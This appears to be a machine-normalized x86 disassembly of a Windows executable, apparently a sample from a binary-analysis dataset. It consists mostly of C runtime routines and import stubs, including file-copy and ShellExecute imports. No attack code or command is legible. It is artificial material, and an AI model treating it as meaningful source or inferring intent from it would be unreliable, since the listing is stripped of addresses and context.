mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40fe78
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_429628
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_40fe78
pop ecx
mov [ ebp - 0x4 ] esi
sub_42902c
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420259
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_40d7cc
test eax eax
je r-xdata
call sub_40d7cc
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_42906c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_429089
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_4290a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rwxdata ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_429089
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_429089
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rwxdata ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
mov ecx [ rwxdata ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_4273b5
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_4273fe
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_40fe78
push edi
call sub_40fe78
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_4273fe
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_40fe78
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_41a5c6
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_4107e9
pop ecx
test eax eax
je r-xdata
call sub_4275c0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_41a5c6
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_4107e9
pop ecx
test eax eax
je r-xdata
call sub_4275c0
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_429417
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4290a7
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_429459
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_429417
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4211c0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_40d7cc
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_429553
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429459
add esp 0x10
pop ebp
retn
pop ebp
jmp sub_4212b2
sub_42957c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rwxdata ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_428f7b
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rwxdata ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rwxdata ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_4295ce
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_41348c
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_410a02
jmp r-xdata
push eax
call sub_429873
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_429628
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x16
push 0x3d
push esi
call sub_429984
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
cmp eax [ rwxdata ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_4295ce
mov [ rwxdata ] eax
mov esi [ rwxdata ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_42957c
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rwxdata ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_413447
pop ecx
mov [ rwxdata ] eax
cmp eax ebx
je r-xdata
call sub_428f95
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40fe78
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_40fe78
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rwxdata ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_413447
pop ecx
mov [ rwxdata ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rwxdata ]
call sub_413526
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rwxdata ]
call sub_413526
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_4136f0
inc eax
pop ecx
inc eax
push eax
call sub_41348c
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_40fe78
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_4136f0
inc eax
pop ecx
inc eax
push eax
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
mov [ rwxdata ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
push edi
call sub_40fe78
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_40d7cc
mov [ eax ] 0x2a
sub_429873
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_4136f0
mov esi eax
inc esi
push esi
call sub_4107e9
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d5e2
add esp 0x14
pop edi
pop esi
sub_4298c8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_4299b0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_4299b0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax rwxdata
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_401000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_40c341
add esp 0x4
pop ebp
retn
ExitProcess
jmp [ ExitProcess@IAT ]
CopyFileW
jmp [ CopyFileW@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
GetTempFileNameA
jmp [ GetTempFileNameA@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
DialogBoxParamA
jmp [ DialogBoxParamA@IAT ]
LoadCursorA
jmp [ LoadCursorA@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
LoadAcceleratorsA
jmp [ LoadAcceleratorsA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
TranslateAcceleratorA
jmp [ TranslateAcceleratorA@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RegisterClassExA
jmp [ RegisterClassExA@IAT ]
GetMessageA
jmp [ GetMessageA@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
ShellExecuteW
jmp [ ShellExecuteW@IAT ]
sub_40b7ee
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d8b5
add esp 0x10
pop ebp
retn
sub_40b8c7
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40d9a4
pop ecx
pop ecx
pop ebp
retn
sub_40b8dc
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40d9dd
pop ecx
pop ecx
pop ebp
retn
sub_40b8f1
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d9c0
add esp 0xc
pop ebp
retn
sub_40b90a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d9f9
add esp 0xc
pop ebp
retn
sub_40b9bb
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40b98b
sub_40ba80
push [ ebp + 0x8 ]
call sub_40de9e
pop ecx
retn
sub_40ba8a
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b9c6
add esp 0xc
pop ebp
retn
sub_40baf4
mov edi edi
push ebp
mov ebp esp
call sub_40e99d
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_40bb06
call sub_40e99d
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_40bd02
push [ ebp + 0x14 ]
call sub_40de9e
pop ecx
retn
sub_40bf0d
push [ ebp + 0x8 ]
call sub_40de9e
pop ecx
retn
sub_40c01c
push [ ebp + 0x8 ]
call sub_40de9e
pop ecx
retn
sub_40c111
push esi
call sub_40de9e
pop ecx
retn
sub_40c215
push esi
call sub_40de9e
pop ecx
retn
sub_40c319
push esi
call sub_40de9e
pop ecx
retn
sub_40c392
mov edi edi
push esi
push 0x1
push rwxdata
mov esi ecx
call sub_41029c
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_40c3ad
mov [ ecx ] r--data
jmp sub_410371
sub_40c3df
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4102b9
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c5fc
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_410fe6
pop ecx
pop ecx
retn
sub_40c610
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_410d25
mov [ ebp - 0x4 ] 0xfffffffe
push eax
call sub_410d00
sub_40c631
mov eax [ ebp - 0x20 ]
jmp sub_40c649
sub_40c636
xor eax eax
inc eax
retn
sub_40c649
call sub_40e351
retn
_start
call sub_411738
jmp sub_40c4d1
sub_40c94a
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx + 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40c958
mov eax ecx
retn
sub_40ca01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
pop ebp
retn
sub_40ca13
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_40ca28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
pop ebp
retn
sub_40d5d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_40d731
push [ rwxdata ]
call sub_40e714
pop ecx
retn
sub_40d73e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40d5e2
sub_40d76f
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
retn
sub_40d77f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40d749
sub_40d933
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d8b5
add esp 0x10
pop ebp
retn
sub_40d9a4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_40d94d
add esp 0x10
pop ebp
retn
sub_40d9c0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_40d94d
add esp 0x10
pop ebp
retn
sub_40d9dd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_413f80
call sub_40d94d
add esp 0x10
pop ebp
retn
sub_40d9f9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_413f80
call sub_40d94d
add esp 0x10
pop ebp
retn
sub_40dbbd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40db35
add esp 0x14
pop ebp
retn
sub_40de0b
call sub_40f70b
cmp [ rwxdata ] 0x0
je r-xdata
push [ rwxdata ]
call sub_40fe78
pop ecx
retn
call sub_415eb6
sub_40e301
push 0x1
call sub_415ff7
pop ecx
retn
sub_40e351
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40e370
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
jmp sub_40b762
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40b762
sub_40e602
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40e52c
add esp 0xc
pop ebp
retn 0x4
sub_40e635
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_4170b5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40e668
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40e52c
add esp 0xc
pop ebp
retn 0x8
sub_40e67f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
pop ebp
jmp sub_4109d2
sub_40e786
call [ TlsAlloc@IAT ]
retn 0x4
sub_40e78f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rwxdata ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_40e7a9
mov eax [ rwxdata ]
retn
sub_40e7e3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rwxdata ]
call sub_40e714
pop ecx
call eax
pop ebp
retn 0x8
sub_40e912
push 0xd
call sub_415ff7
pop ecx
retn
sub_40e91b
push 0xc
call sub_415ff7
pop ecx
retn
